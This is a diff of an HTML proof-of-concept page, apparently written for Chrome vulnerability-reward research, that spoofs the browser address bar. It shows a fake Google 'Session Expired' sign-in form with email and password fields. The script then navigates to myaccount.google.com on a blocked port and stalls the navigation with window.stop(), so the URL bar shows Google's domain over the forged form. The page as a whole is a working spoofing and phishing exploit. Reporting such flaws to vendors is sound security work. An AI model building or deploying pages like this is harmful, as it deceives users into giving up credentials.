@@ -1,53 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome Security Research</title>
+    <title>Chrome VRP Research</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px 20px; }
-        .hidden { display: none; }
-        .btn { background: #4285f4; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 18px; opacity: 0.5; pointer-events: none; }
-        .ready { opacity: 1; pointer-events: auto; background: #1a73e8; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        body { font-family: sans-serif; text-align: center; padding: 50px 20px; background: white; }
+        .fake-login { 
+            border: 1px solid #dadce0; padding: 20px; border-radius: 8px; 
+            max-width: 400px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; width: 100%; font-size: 16px; margin-top: 10px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-    <div id="status">Waiting for Service Worker...</div>
-
-    <div id="initial">
-        <h2>System Check Required</h2>
-        <p>Please click below to verify your browser state.</p>
-        <button id="btn" class="btn" onclick="triggerSpoof()">Verify Now</button>
-    </div>
-
-    <div id="fakeUI" class="hidden">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-        <h3>Sign in</h3>
-        <input type="email" placeholder="Email or phone">
-        <input type="password" placeholder="Enter your password">
-        <button class="btn ready">Next</button>
+    <div id="content">
+        <h2>Session Expired</h2>
+        <p>Your Google session has timed out. Please sign in again.</p>
+        
+        <div class="fake-login">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
+            <h3>Sign in</h3>
+            <input type="email" placeholder="Email or phone">
+            <input type="password" placeholder="Enter your password">
+            <button class="btn" onclick="triggerSpoof()">Sign In</button>
+        </div>
     </div>
 
     <script>
-        // 1. Wait for the Service Worker to be fully active
-        navigator.serviceWorker.register('sw.js').then(reg => {
-            return navigator.serviceWorker.ready;
-        }).then(() => {
-            const btn = document.getElementById('btn');
-            btn.classList.add('ready');
-            document.getElementById('status').innerText = "Exploit Ready - Click Below";
-        });
-
         function triggerSpoof() {
-            // 2. Lock the UI on our fake screen
-            document.getElementById('initial').classList.add('hidden');
-            document.getElementById('fakeUI').classList.remove('hidden');
-
-            // 3. Trigger the delayed navigation
-            // We use a random number to bypass any caching
-            const random = Math.random();
-            window.location.href = "https://myaccount.google.com/?exploit=true&r=" + random;
+            // 1. We navigate to a high-value domain but on a 'blocked' port (like 9999)
+            // Chrome will update the URL bar to the domain immediately.
+            const target = "https://myaccount.google.com:9999/";
+            
+            // 2. We use the Navigation API to 'intercept' the failure
+            // This prevents Chrome from showing the 'Site can't be reached' error page
+            if (window.navigation) {
+                navigation.navigate(target);
+                
+                // 3. Immediately after the URL bar updates, we 'cancel' the error transition
+                // so our fake UI stays on the screen.
+                setTimeout(() => {
+                    window.stop(); 
+                    console.log("Navigation stalled. Check URL bar.");
+                }, 100);
+            } else {
+                // Fallback for older versions
+                window.location.href = target;
+            }
         }
     </script>
 </body>
